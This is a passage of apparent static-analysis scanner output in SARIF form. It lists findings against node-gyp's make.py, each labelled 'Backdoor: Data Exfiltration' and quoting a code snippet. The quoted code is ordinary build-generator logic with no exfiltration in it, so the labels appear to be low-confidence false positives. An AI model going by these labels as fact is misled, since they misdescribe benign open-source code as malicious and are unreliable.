                    "text": "                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n",
                    "rendered": {
                      "text": "                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n",
                      "markdown": "`                # As a workaround, manually expand variables at gyp time. Since 'copies'\n                # can't run scripts, there's no need to write the env then.\n                # WriteDoCmd() will escape spaces for .d files.\n                env = self.GetSortedXcodeEnv()\n                output = gyp.xcode_emulation.ExpandEnvVars(output, env)\n                path = gyp.xcode_emulation.ExpandEnvVars(path, env)\n                self.WriteDoCmd([output], [path], \"copy\", part_of_all)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1300,
                  "startColumn": 40,
                  "endLine": 1300,
                  "endColumn": 61,
                  "snippet": {
                    "text": "                )\n\n                # If the output path has variables in it, which happens in practice for\n                # 'copies', writing the environment as target-local doesn't work,\n                # because the variables are already needed for the target name.\n                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n",
                    "rendered": {
                      "text": "                )\n\n                # If the output path has variables in it, which happens in practice for\n                # 'copies', writing the environment as target-local doesn't work,\n                # because the variables are already needed for the target name.\n                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n",
                      "markdown": "`                )\n\n                # If the output path has variables in it, which happens in practice for\n                # 'copies', writing the environment as target-local doesn't work,\n                # because the variables are already needed for the target name.\n                # Copying the environment variables into global make variables doesn't\n                # work either, because then the .d files will potentially contain spaces\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1151,
                  "startColumn": 8,
                  "endLine": 1151,
                  "endColumn": 22,
                  "snippet": {
                    "text": "                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n",
                    "rendered": {
                      "text": "                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n",
                      "markdown": "`                       rules (used to make other pieces dependent on these rules)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for rule in rules:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, rule[\"rule_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1105,
                  "startColumn": 33,
                  "endLine": 1105,
                  "endColumn": 57,
                  "snippet": {
                    "text": "            # Same for environment.\n            self.WriteLn(\"%s: obj := $(abs_obj)\" % QuoteSpaces(outputs[0]))\n            self.WriteLn(\"%s: builddir := $(abs_builddir)\" % QuoteSpaces(outputs[0]))\n            self.WriteSortedXcodeEnv(outputs[0], self.GetSortedXcodeEnv())\n\n            for input in inputs:\n                assert \" \" not in input, (\n",
                    "rendered": {
                      "text": "            # Same for environment.\n            self.WriteLn(\"%s: obj := $(abs_obj)\" % QuoteSpaces(outputs[0]))\n            self.WriteLn(\"%s: builddir := $(abs_builddir)\" % QuoteSpaces(outputs[0]))\n            self.WriteSortedXcodeEnv(outputs[0], self.GetSortedXcodeEnv())\n\n            for input in inputs:\n                assert \" \" not in input, (\n",
                      "markdown": "`            # Same for environment.\n            self.WriteLn(\"%s: obj := $(abs_obj)\" % QuoteSpaces(outputs[0]))\n            self.WriteLn(\"%s: builddir := $(abs_builddir)\" % QuoteSpaces(outputs[0]))\n            self.WriteSortedXcodeEnv(outputs[0], self.GetSortedXcodeEnv())\n\n            for input in inputs:\n                assert \" \" not in input, (\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1027,
                  "startColumn": 8,
                  "endLine": 1027,
                  "endColumn": 22,
                  "snippet": {
                    "text": "                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n",
                    "rendered": {
                      "text": "                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n",
                      "markdown": "`                       actions)\n        part_of_all: flag indicating this target is part of 'all'\n        \"\"\"\n        env = self.GetSortedXcodeEnv()\n        for action in actions:\n            name = StringToMakefileVariable(\n                \"{}_{}\".format(self.qualified_target, action[\"action_name\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2738,
                  "startColumn": 64,
                  "endLine": 2738,
                  "endColumn": 69,
                  "snippet": {
                    "text": "        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n",
                    "rendered": {
                      "text": "        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n",
                      "markdown": "`        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2738,
                  "startColumn": 26,
                  "endLine": 2738,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n",
                    "rendered": {
                      "text": "        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n",
                      "markdown": "`        root_makefile.write(\"endif\\n\")\n    root_makefile.write(\"\\n\")\n\n    if not generator_flags.get(\"standalone\") and generator_flags.get(\n        \"auto_regeneration\", True\n    ):\n        WriteAutoRegenerationRule(params, root_makefile, makefile_name, build_files)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2645,
                  "startColumn": 52,
                  "endLine": 2645,
                  "endColumn": 57,
                  "snippet": {
                    "text": "    for qualified_target in target_list:\n        build_file, target, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings_array == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n",
                    "rendered": {
                      "text": "    for qualified_target in target_list:\n        build_file, target, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings_array == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n",
                      "markdown": "`    for qualified_target in target_list:\n        build_file, target, toolset = gyp.common.ParseQualifiedTarget(qualified_target)\n\n        this_make_global_settings = data[build_file].get(\"make_global_settings\", [])\n        assert make_global_settings_array == this_make_global_settings, (\n            \"make_global_settings needs to be the same for all targets \"\n            f\"{this_make_global_settings} vs. {make_global_settings}\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2594,
                  "startColumn": 26,
                  "endLine": 2594,
                  "endColumn": 31,
                  "snippet": {
                    "text": "            continue\n        if value[0] != \"$\":\n            value = \"$(abspath %s)\" % value\n        wrapper = wrappers.get(key)\n        if wrapper:\n            value = f\"{wrapper} {value}\"\n            del wrappers[key]\n",
                    "rendered": {
                      "text": "            continue\n        if value[0] != \"$\":\n            value = \"$(abspath %s)\" % value\n        wrapper = wrappers.get(key)\n        if wrapper:\n            value = f\"{wrapper} {value}\"\n            del wrappers[key]\n",
                      "markdown": "`            continue\n        if value[0] != \"$\":\n            value = \"$(abspath %s)\" % value\n        wrapper = wrappers.get(key)\n        if wrapper:\n            value = f\"{wrapper} {value}\"\n            del wrappers[key]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2583,
                  "startColumn": 49,
                  "endLine": 2583,
                  "endColumn": 54,
                  "snippet": {
                    "text": "        )\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_array = data[build_file].get(\"make_global_settings\", [])\n    wrappers = {}\n    for key, value in make_global_settings_array:\n        if key.endswith(\"_wrapper\"):\n",
                    "rendered": {
                      "text": "        )\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_array = data[build_file].get(\"make_global_settings\", [])\n    wrappers = {}\n    for key, value in make_global_settings_array:\n        if key.endswith(\"_wrapper\"):\n",
                      "markdown": "`        )\n\n    build_file, _, _ = gyp.common.ParseQualifiedTarget(target_list[0])\n    make_global_settings_array = data[build_file].get(\"make_global_settings\", [])\n    wrappers = {}\n    for key, value in make_global_settings_array:\n        if key.endswith(\"_wrapper\"):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2412,
                  "startColumn": 36,
                  "endLine": 2412,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n        \"\"\"Determine where to write a Makefile for a given gyp file.\"\"\"\n",
                    "rendered": {
                      "text": "    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n        \"\"\"Determine where to write a Makefile for a given gyp file.\"\"\"\n",
                      "markdown": "`    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n        \"\"\"Determine where to write a Makefile for a given gyp file.\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2411,
                  "startColumn": 41,
                  "endLine": 2411,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                    "rendered": {
                      "text": "    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n",
                      "markdown": "`    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n    def CalculateMakefilePath(build_file, base_name):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2410,
                  "startColumn": 35,
                  "endLine": 2410,
                  "endColumn": 40,
                  "snippet": {
                    "text": "    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n",
                    "rendered": {
                      "text": "    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n",
                      "markdown": "`    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 2409,
                  "startColumn": 28,
                  "endLine": 2409,
                  "endColumn": 33,
                  "snippet": {
                    "text": "def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n",
                    "rendered": {
                      "text": "def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n",
                      "markdown": "`def GenerateOutput(target_list, target_dicts, data, params):\n    options = params[\"options\"]\n    flavor = gyp.common.GetFlavor(params)\n    generator_flags = params.get(\"generator_flags\", {})\n    builddir_name = generator_flags.get(\"output_dir\", \"out\")\n    android_ndk_version = generator_flags.get(\"android_ndk_version\", None)\n    default_target = generator_flags.get(\"default_target\", \"all\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1749,
                  "startColumn": 28,
                  "endLine": 1749,
                  "endColumn": 33,
                  "snippet": {
                    "text": "                        self.xcode_settings.GetLibtoolflags(configname),\n                        \"LIBTOOLFLAGS_%s\" % configname,\n                    )\n            libraries = spec.get(\"libraries\")\n            if libraries:\n                # Remove duplicate entries\n                libraries = gyp.common.uniquer(libraries)\n",
                    "rendered": {
                      "text": "                        self.xcode_settings.GetLibtoolflags(configname),\n                        \"LIBTOOLFLAGS_%s\" % configname,\n                    )\n            libraries = spec.get(\"libraries\")\n            if libraries:\n                # Remove duplicate entries\n                libraries = gyp.common.uniquer(libraries)\n",
                      "markdown": "`                        self.xcode_settings.GetLibtoolflags(configname),\n                        \"LIBTOOLFLAGS_%s\" % configname,\n                    )\n            libraries = spec.get(\"libraries\")\n            if libraries:\n                # Remove duplicate entries\n                libraries = gyp.common.uniquer(libraries)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1741,
                  "startColumn": 37,
                  "endLine": 1741,
                  "endColumn": 42,
                  "snippet": {
                    "text": "                        # into the link command, so we need lots of escaping.\n                        ldflags.append(r\"-Wl,-rpath=\\$$ORIGIN/\")\n                        ldflags.append(r\"-Wl,-rpath-link=\\$(builddir)/\")\n                library_dirs = config.get(\"library_dirs\", [])\n                ldflags += [(\"-L%s\" % library_dir) for library_dir in library_dirs]\n                self.WriteList(ldflags, \"LDFLAGS_%s\" % configname)\n                if self.flavor == \"mac\":\n",
                    "rendered": {
                      "text": "                        # into the link command, so we need lots of escaping.\n                        ldflags.append(r\"-Wl,-rpath=\\$$ORIGIN/\")\n                        ldflags.append(r\"-Wl,-rpath-link=\\$(builddir)/\")\n                library_dirs = config.get(\"library_dirs\", [])\n                ldflags += [(\"-L%s\" % library_dir) for library_dir in library_dirs]\n                self.WriteList(ldflags, \"LDFLAGS_%s\" % configname)\n                if self.flavor == \"mac\":\n",
                      "markdown": "`                        # into the link command, so we need lots of escaping.\n                        ldflags.append(r\"-Wl,-rpath=\\$$ORIGIN/\")\n                        ldflags.append(r\"-Wl,-rpath-link=\\$(builddir)/\")\n                library_dirs = config.get(\"library_dirs\", [])\n                ldflags += [(\"-L%s\" % library_dir) for library_dir in library_dirs]\n                self.WriteList(ldflags, \"LDFLAGS_%s\" % configname)\n                if self.flavor == \"mac\":\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1734,
                  "startColumn": 36,
                  "endLine": 1734,
                  "endColumn": 41,
                  "snippet": {
                    "text": "                    if target_postbuild:\n                        target_postbuilds[configname] = target_postbuild\n                else:\n                    ldflags = config.get(\"ldflags\", [])\n                    # Compute an rpath for this output if needed.\n                    if any(dep.endswith(\".so\") or \".so.\" in dep for dep in deps):\n                        # We want to get the literal string \"$ORIGIN\"\n",
                    "rendered": {
                      "text": "                    if target_postbuild:\n                        target_postbuilds[configname] = target_postbuild\n                else:\n                    ldflags = config.get(\"ldflags\", [])\n                    # Compute an rpath for this output if needed.\n                    if any(dep.endswith(\".so\") or \".so.\" in dep for dep in deps):\n                        # We want to get the literal string \"$ORIGIN\"\n",
                      "markdown": "`                    if target_postbuild:\n                        target_postbuilds[configname] = target_postbuild\n                else:\n                    ldflags = config.get(\"ldflags\", [])\n                    # Compute an rpath for this output if needed.\n                    if any(dep.endswith(\".so\") or \".so.\" in dep for dep in deps):\n                        # We want to get the literal string \"$ORIGIN\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1715,
                  "startColumn": 35,
                  "endLine": 1715,
                  "endColumn": 40,
                  "snippet": {
                    "text": "                        configname,\n                        generator_default_variables[\"PRODUCT_DIR\"],\n                        lambda p: Sourceify(self.Absolutify(p)),\n                        arch=config.get(\"xcode_configuration_platform\"),\n                    )\n\n                    # TARGET_POSTBUILDS_$(BUILDTYPE) is added to postbuilds later on.\n",
                    "rendered": {
                      "text": "                        configname,\n                        generator_default_variables[\"PRODUCT_DIR\"],\n                        lambda p: Sourceify(self.Absolutify(p)),\n                        arch=config.get(\"xcode_configuration_platform\"),\n                    )\n\n                    # TARGET_POSTBUILDS_$(BUILDTYPE) is added to postbuilds later on.\n",
                      "markdown": "`                        configname,\n                        generator_default_variables[\"PRODUCT_DIR\"],\n                        lambda p: Sourceify(self.Absolutify(p)),\n                        arch=config.get(\"xcode_configuration_platform\"),\n                    )\n\n                    # TARGET_POSTBUILDS_$(BUILDTYPE) is added to postbuilds later on.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1665,
                  "startColumn": 35,
                  "endLine": 1665,
                  "endColumn": 40,
                  "snippet": {
                    "text": "            deps.extend(link_deps)\n            # TODO: It seems we need to transitively link in libraries (e.g. -lfoo)?\n            # This hack makes it work:\n            # link_deps.extend(spec.get('libraries', []))\n        return (gyp.common.uniquer(deps), gyp.common.uniquer(link_deps))\n\n    def GetSharedObjectFromSidedeck(self, sidedeck):\n",
                    "rendered": {
                      "text": "            deps.extend(link_deps)\n            # TODO: It seems we need to transitively link in libraries (e.g. -lfoo)?\n            # This hack makes it work:\n            # link_deps.extend(spec.get('libraries', []))\n        return (gyp.common.uniquer(deps), gyp.common.uniquer(link_deps))\n\n    def GetSharedObjectFromSidedeck(self, sidedeck):\n",
                      "markdown": "`            deps.extend(link_deps)\n            # TODO: It seems we need to transitively link in libraries (e.g. -lfoo)?\n            # This hack makes it work:\n            # link_deps.extend(spec.get('libraries', []))\n        return (gyp.common.uniquer(deps), gyp.common.uniquer(link_deps))\n\n    def GetSharedObjectFromSidedeck(self, sidedeck):\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/generator/make.py"
                },
                "region": {
                  "startLine": 1628,
                  "startColumn": 19,
                  "endLine": 1628,
                  "endColumn": 24,
                  "snippet": {
                    "text": "        path = os.path.join(\"$(obj).\" + self.toolset, self.path)\n        if self.type == \"executable\" or self._InstallImmediately():\n            path = \"$(builddir)\"\n        path = spec.get(\"product_dir\", path)\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def ComputeMacBundleOutput(self, spec):\n",
                    "rendered": {
                      "text": "        path = os.path.join(\"$(obj).\" + self.toolset, self.path)\n        if self.type == \"executable\" or self._InstallImmediately():\n            path = \"$(builddir)\"\n        path = spec.get(\"product_dir\", path)\n        return os.path.join(path, self.ComputeOutputBasename(spec))\n\n    def ComputeMacBundleOutput(self, spec):\n",
